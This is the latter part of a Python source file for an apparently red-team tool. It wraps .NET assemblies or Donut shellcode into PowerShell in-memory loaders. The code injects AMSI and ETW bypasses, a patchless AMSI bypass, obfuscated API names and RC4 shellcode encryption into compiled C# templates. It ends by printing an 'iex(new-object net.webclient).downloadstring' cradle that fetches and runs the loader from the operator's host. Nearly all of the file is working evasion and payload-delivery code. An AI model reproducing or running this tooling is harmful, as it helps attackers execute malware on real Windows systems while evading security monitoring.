            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<AMSI.DLL_002>', f'''"{reverse_and_rot('amsi.dll', s)}", {s}''')
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<AMSISCANBUFFER_001>', f'''"{reverse_and_rot('AmsiScanBuffer', s)}", {s}''')

        if args.no_etw:
            TEMPLATE = TEMPLATE.replace('<ETW_BLOCK>\n\n', '')
            TEMPLATE = TEMPLATE.replace('<ETW_BLOCK_APPLY>\n\n', '')
        else:
            TEMPLATE = TEMPLATE.replace('<ETW_BLOCK>', ETW_BLOCK)
            TEMPLATE = TEMPLATE.replace('<ETW_BLOCK_APPLY>', ETW_BLOCK_APPLY)
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTDLL_005>', f'''"{reverse_and_rot('ntdll.dll', s)}", {s}''')
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<NTDLL_006>', f'''"{reverse_and_rot('ntdll.dll', s)}", {s}''')
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<ETWEVENTWRITE_001>', f'''"{reverse_and_rot('EtwEventWrite', s)}", {s}''')

        if args.no_rc4:
            TEMPLATE = TEMPLATE.replace('<ENCRYPT_SHELLCODE>\n', '')
            TEMPLATE = TEMPLATE.replace('<ENCRYPT_SHELLCODE_APPLY>\n\n', '')
        else:
            global ENCRYPT_SHELLCODE_APPLY
            ENCRYPT_SHELLCODE_APPLY = ENCRYPT_SHELLCODE_APPLY.replace('<RC4_KEY>', f'"{key.decode()}"')
            TEMPLATE = TEMPLATE.replace('<ENCRYPT_SHELLCODE>', ENCRYPT_SHELLCODE)
            TEMPLATE = TEMPLATE.replace('<ENCRYPT_SHELLCODE_APPLY>', ENCRYPT_SHELLCODE_APPLY)
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<ADVAPI32.DLL_001>', f'''"{reverse_and_rot('advapi32.dll', s)}", {s}''')
            s = randint(1, 25); TEMPLATE = TEMPLATE.replace('<SYSTEMFUNCTION032_001>', f'''"{reverse_and_rot('SystemFunction032', s)}", {s}''')

        if args.no_wait:
            TEMPLATE = TEMPLATE.replace('<DWMILLISECONDS_001>', '3000')
            TEMPLATE = TEMPLATE.replace('<RESET_EXIT_FUNCTIONS>\n\n', '')
            TEMPLATE = TEMPLATE.replace('<PRINT_ORIGINAL_EXIT_BYTES>', 'ExitPatcher.PrintOriginalBytes();')
        else:
            TEMPLATE = TEMPLATE.replace('<DWMILLISECONDS_001>', '0xFFFFFFFF')
            TEMPLATE = TEMPLATE.replace('<RESET_EXIT_FUNCTIONS>', 'ExitPatcher.ResetExitFunctions();')
            TEMPLATE = TEMPLATE.replace('<PRINT_ORIGINAL_EXIT_BYTES>\n\n', '')

        TEMPLATE = re.sub(r'\s+\/\/.*', '', TEMPLATE)

        delete = False if args.debug or is_windows() else True
        with tempfile.NamedTemporaryFile('w', suffix='.cs', delete=delete) as tmp:
            tmp.write(TEMPLATE)
            tmp.flush()
            if args.debug:
                tmp.close()

            payload_path = Path(tempfile.gettempdir()) / 'AssemblyApp.exe'
            compile_cmd = f'{compiler} /t:exe /platform:x64 /out:{payload_path} {tmp.name}'
            if args.silent: compile_cmd += to_null
            info(compile_cmd)
            os.system(compile_cmd)

    with open(payload_path, 'rb') as f:
        deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
        payload_compressed = deflate_stream.compress(f.read())
        payload_compressed += deflate_stream.flush()
    payload_compressed_b64 = base64.b64encode(payload_compressed).decode()

    type_ = method = arguments = None
    if not args.donut:
        try:
            assembly = DotNetPE(str(payload_path))
            entrypoint = assembly.Cor20Header.get_header_entry_point()
            namespace = entrypoint.Namespace
            type_ = entrypoint.Type
            method = entrypoint.Method

            signature = entrypoint.Signature
            arguments = '(, [string[]]$args)' if signature['parameter'] == 'System.String[]' else '$null'

            if len(type_) != len(type_.encode()):
                type_ = '$(' + repr(type_).replace("'", '').replace('\\u', '+[char]0x').lstrip('+') + ')'
            if len(method) != len(method.encode()):
                method = '$(' + repr(method).replace("'", '').replace('\\u', '+[char]0x').lstrip('+') + ')'
        except:
            pass

    if (args.donut or args.obfuscator) and not args.debug and not is_windows():
        os.remove(payload_path)

    try:
        os.remove(payload_path_temp)
    except:
        pass

    if args.entrypoint and not args.donut:
        entrypoint = args.entrypoint.split(',')
        namespace, type_, method = entrypoint
    elif any(val is None for val in (namespace, type_, method)):
        if not args.donut:
            namespace = payload_path_stem
        type_ = 'Program'
        method = 'Main'

    if namespace:
        namespace += '.'

    if args.no_args or args.donut:
        arguments = '$null'
    elif args.args_type == 'string':
        arguments = '(, ([string[]]$args -Join " "))'
    elif arguments is None:
        arguments = '(, [string[]]$args)'

    if args.debug:
        debug(f'Entry point -> {namespace}{type_}.{method}, arguments -> {arguments}')

    payload_func_name = f'Invoke-{payload_path_stem}'
    if args.donut: payload_func_name += 'Inject'

    cmdlet_name = f'{payload_func_name}'
    output_path = Path.cwd() / cmdlet_name
    try:
        output = Path(args.output).resolve()
    except:
        pass
    else:
        if output.is_dir():
            cmdlet_name = f'{payload_func_name}'
            output_path = output / cmdlet_name
        elif output.parent.is_dir():
            cmdlet_name = output.name
            output_path = output
    output_path = Path(f'{str(output_path)}.ps1')

    pwsh = f'''\
function {cmdlet_name}
{{
'''

    if args.patchless_amsi:
        pwsh += '''\
    Invoke-ThePatchless "Main"

'''

    if args.no_env_exit:
        pwsh += '''\
    Invoke-ThePatchless "PatchEnvironmentExit"

'''

    pwsh += f'''\
    $a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("{payload_compressed_b64}"))
    $b = New-Object System.IO.Compression.DeflateStream($a, [System.IO.Compression.CompressionMode]::Decompress)
    $c = New-Object System.IO.MemoryStream
    $b.CopyTo($c)
    [byte[]]$d = $c.ToArray()

'''

    if not args.no_redirect_std:
        pwsh += f'''\
    $e = [System.Console]::Out
    $f = [System.Console]::Error
    $g = New-Object System.IO.StringWriter
    $h = New-Object System.IO.StringWriter
    [System.Console]::SetOut($g)
    [System.Console]::SetError($h)

'''

    if args.emit:
        pwsh += f'''\
    $i = New-Object System.Reflection.Emit.DynamicMethod("_Invoke", [void], @([byte[]], [object], [object[]]))
    $j = $i.GetILGenerator()
    $j.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
    $j.EmitCall([System.Reflection.Emit.OpCodes]::Call, [System.Reflection.Assembly].GetMethod("Load", [System.Type[]] @([byte[]])), $null)
    $j.Emit([System.Reflection.Emit.OpCodes]::Ldstr, "{namespace}{type_}")
    $j.EmitCall([System.Reflection.Emit.OpCodes]::Callvirt, [System.Reflection.Assembly].GetMethod("GetType", [System.Type[]] @([string])), $null)
    $j.Emit([System.Reflection.Emit.OpCodes]::Ldstr, "{method}")
    $j.EmitCall([System.Reflection.Emit.OpCodes]::Callvirt, [System.Type].GetMethod("GetMethod", [System.Type[]] @([string])), $null)
    $j.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
    $j.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
    $j.EmitCall([System.Reflection.Emit.OpCodes]::Callvirt, [System.Reflection.MethodBase].GetMethod("Invoke", [System.Type[]] @([object], [object[]])), $null)
    $j.Emit([System.Reflection.Emit.OpCodes]::Pop)
    $j.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $i.Invoke($null, [object[]] @($d, $null, {arguments}))

'''
    else:
        pwsh += f'''\
    $i = [System.Reflection.Assembly]::Load($d)
    $j = [Reflection.BindingFlags]"Public,NonPublic,Static"
    $k = $i.GetType("{namespace}{type_}", $j)
    $l = $k.GetMethod("{method}", $j)
    $l.Invoke($null, {arguments})
'''
    
    if not args.no_redirect_std:
        pwsh += f'''
    [System.Console]::SetError($f)
    [System.Console]::SetOut($e)
    $m = ""
    $m += $g.ToString()
    $m += $h.ToString()
    $m
'''

    pwsh += '}'

    if args.patchless_amsi:
        global PATCHLESS_AMSI_BYPASS_TEMPLATE
        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<NAMESPACE>', 'AssemblyApp')
        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<ROT_AND_REVERSE>', ROT_AND_REVERSE)

        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<CLASS_DPINVOKE>', CLASS_DPINVOKE)
        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<ASSEMBLYNAME>', f'"{gen_random_string(6)}"')
        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DEFINEDYNAMICMODULE>', f'"{gen_random_string(6)}"')
        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DPINVOKE_LOADLIBRARY>', DPINVOKE_LOADLIBRARY)
        PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DPINVOKE_GETPROCADDRESS>', DPINVOKE_GETPROCADDRESS)

        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<AMSI.DLL_001>', f'''"{reverse_and_rot('amsi.dll', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<AMSISCANBUFFER_001>', f'''"{reverse_and_rot('AmsiScanBuffer', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_001>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<LOADLIBRARY_001>', f'''"{reverse_and_rot('LoadLibrary', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_002>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<GETPROCADDRESS_001>', f'''"{reverse_and_rot('GetProcAddress', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_006>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<ADDVECTOREDEXCEPTIONHANDLER_001>', f'''"{reverse_and_rot('AddVectoredExceptionHandler', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_004>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<GETTHREADCONTEXT_001>', f'''"{reverse_and_rot('GetThreadContext', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_005>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
        s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<SETTHREADCONTEXT_001>', f'''"{reverse_and_rot('SetThreadContext', s)}", {s}''')

        if args.no_env_exit:
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<PATCH_ENVIRONMENT_EXIT>', PATCH_ENVIRONMENT_EXIT)
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DPINVOKE_VIRTUALQUERY>', DPINVOKE_VIRTUALQUERY)
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DPINVOKE_VIRTUALPROTECT>', DPINVOKE_VIRTUALPROTECT)
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<CLASS_MBI>', CLASS_MBI)
            s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<EXIT_001>', f'''"{reverse_and_rot('Exit', s)}", {s}''')
            s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_007>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
            s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<VIRTUALQUERY_001>', f'''"{reverse_and_rot('VirtualQuery', s)}", {s}''')
            s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<KERNEL32.DLL_003>', f'''"{reverse_and_rot('kernel32.dll', s)}", {s}''')
            s = randint(1, 25); PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<VIRTUALPROTECT_001>', f'''"{reverse_and_rot('VirtualProtect', s)}", {s}''')
        else:
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<PATCH_ENVIRONMENT_EXIT>\n', '')
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DPINVOKE_VIRTUALQUERY>\n\n', '')
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<DPINVOKE_VIRTUALPROTECT>\n\n', '')
            PATCHLESS_AMSI_BYPASS_TEMPLATE = PATCHLESS_AMSI_BYPASS_TEMPLATE.replace('<CLASS_MBI>\n', '')

        PATCHLESS_AMSI_BYPASS_TEMPLATE = re.sub(r'\s+\/\/.*', '', PATCHLESS_AMSI_BYPASS_TEMPLATE)

        delete = False if args.debug or is_windows() else True
        with tempfile.NamedTemporaryFile('w', suffix='.cs', delete=delete) as tmp:
            tmp.write(PATCHLESS_AMSI_BYPASS_TEMPLATE)
            tmp.flush()
            if args.debug:
                tmp.close()

            payload_path = Path(tempfile.gettempdir()) / 'AssemblyApp.exe'
            compile_cmd = f'{compiler} /t:exe /platform:x64 /out:{payload_path} {tmp.name}'
            if args.no_env_exit: compile_cmd += ' /unsafe'
            if args.silent: compile_cmd += to_null
            info(compile_cmd)
            os.system(compile_cmd)

        with open(payload_path, 'rb') as f:
            deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
            payload_compressed = deflate_stream.compress(f.read())
            payload_compressed += deflate_stream.flush()
        payload_compressed_b64 = base64.b64encode(payload_compressed).decode()

        if not args.debug:
            os.remove(payload_path)

        patchless_amsi_bypass = f'''\
function Invoke-ThePatchless
{{
    $a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("{payload_compressed_b64}"))
    $b = New-Object System.IO.Compression.DeflateStream($a, [System.IO.Compression.CompressionMode]::Decompress)
    $c = New-Object System.IO.MemoryStream
    $b.CopyTo($c)
    [byte[]]$d = $c.ToArray()

    $e = [System.Reflection.Assembly]::Load($d)
    $f = [Reflection.BindingFlags]"Public,NonPublic,Static"
    $g = $e.GetType("AssemblyApp.Program", $f)
    $h = $g.GetMethod($args[0], $f)
    $h.Invoke($null, $null)
}}

'''
        pwsh = patchless_amsi_bypass + pwsh

    if args.no_func and not args.patchless_amsi:
        pwsh = re.search(r'\{(.*)\}', pwsh, flags=re.DOTALL).group(1).strip().replace('    ', '')

    with open(output_path, 'w') as f:
        f.write(pwsh)

    iface = ni.gateways()['default'][ni.AF_INET][1]
    lhost = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']

    success(f'Loader -> {output_path}')
    try:
        if module:
            success(f'Stager -> {server}{module}')
    except:
        pass

    info_msg = f'iex(new-object net.webclient).downloadstring("http://{lhost}/{output_path.name}")'
    if not args.no_func:
        info_msg += f';{cmdlet_name}'

    info(info_msg)


if __name__ == '__main__':
    if is_windows():
        from colorama import init
        init()
    else:  # is_unix()
        BANNER = BANNER.lstrip()

    parser = ArgumentParser(description='Craft PowerShell in-memory loaders from .NET assemblies and native binaries.')
    parser.add_argument('payload_string', action='store', type=str, help='path to the executable (optionally with arguments if run with --donut) to be wrapped in PowerShell | '
                                                                         'if the executable does not exist on disk, we\'ll try to auto download it from https://github.com/Flangvik/SharpCollection')
    parser.add_argument('-o', '--output', action='store', type=str, help='output path (default directory is CWD, default cmdlet name if the original filename)')
    parser.add_argument('-obf', '--obfuscator', action='store', default=False, choices={'yetAnotherObfuscator', 'NixImports'},
                        help='obfuscate the assembly first with yetAnotherObfuscator (by @0xb11a1, https://github.com/0xb11a1/yetAnotherObfuscator) '
                             'or with NixImports (by @dr4k0nia, https://github.com/dr4k0nia/NixImports)')
    parser.add_argument('--silent', action='store_true', default=False, help='supress os.system output and also the banner')
    parser.add_argument('--debug', action='store_true', default=False, help='debug mode')

    group = parser.add_argument_group('PS template options')
    group.add_argument('-e', '--entrypoint', action='store', type=str, help='the entry point as a comma-separated string of Namespace,Type,Method')
    group.add_argument('-na', '--no-args', action='store_true', default=False, help='pass $args to Main')
    group.add_argument('-at', '--args-type', action='store', type=str, default='array', choices={'array', 'string'}, help='pass the arguments to the entry point as an array or as a string')
    group.add_argument('-nrs', '--no-redirect-std', action='store_true', default=False, help='do NOT redirect StdOut and StdError to string variables before printing them (output shows in real-time)')
    group.add_argument('--emit', action='store_true', default=False, help='use System.Reflection.Emit to build an assembly from memory (default is System.Reflection.Assembly)')
    group.add_argument('--noFUNC', dest='no_func', action='store_true', default=False, help='do NOT wrap the output within a function definition')

    group = parser.add_argument_group('C# template options (Donut shellcode injector)')
    group.add_argument('--noAMSI', dest='no_amsi', action='store_true', default=False, help='do NOT apply AMSI bypass')
    group.add_argument('--noETW', dest='no_etw', action='store_true', default=False, help='do NOT apply ETW block')
    group.add_argument('--noRC4', dest='no_rc4', action='store_true', default=False, help='do NOT apply shellcode RC4 (SystemFunction032) encryption')
    group.add_argument('-pa', '--patchlessAMSI', dest='patchless_amsi', action='store_true', default=False, help='embed Patchless AMSI bypass in the PowerShell loader')
    group.add_argument('--noENVEXIT', dest='no_env_exit', action='store_true', default=False, help='embed EnvironmentExit patch in the PowerShell loader, must be used with -pa/--patchlessAMSI')
    group.add_argument('--noWAIT', dest='no_wait', action='store_true', default=False, help='do NOT wait for infinite on WaitForSingleObject')

    group = parser.add_argument_group('Donut options')
    group.add_argument('-d', '--donut', action='store_true', default=False, help='create a Donut (https://github.com/S4ntiagoP/donut/tree/syscalls) shellcode from the executable first')
    group.add_argument('-j', '--decoy', action='store', type=str, help='optional path of decoy module for Module Overloading')
    group.add_argument('-s', '--server', action='store', type=str, help='optional server path that will host the Donut stager module (ex. https://example.com/)')
    group.add_argument('-n', '--module', action='store', type=str, help='optional stager module name (default is generated randomly)')
    group.add_argument('-u', '--username', action='store', type=str, help='optional username used in stager server authentication (must be used with -u/--username)')
    group.add_argument('-p', '--password', action='store', type=str, help='optional password used in stager server authentication (must be used with -p/--password)')
    group.add_argument('-wh', '--syswhispers3', action='store', type=str, help='path to syswhispers.py (by @KlezVirus, https://gitlab.porchetta.industries/KlezVirus/SysWhispers3)')
    group.add_argument('-whm', '--syswhispers3-method', action='store', type=str, choices=['embedded', 'jumper', 'jumper_randomized'], default='embedded', help='SysWhispers3 syscall recovery method')
    group.add_argument('--rehash', action='store', type=str, choices=['y', 'yes', 'n', 'no'], help='rehash Donut syscalls prompt behavior')

    args = parser.parse_args()

    if args.no_env_exit and not args.patchless_amsi:
        error('Option -exit/--noENVEXIT must be used with -pa/--patchlessAMSI')
        sys.exit(-1)

    if not args.silent:
        print(BANNER)
    main(args)
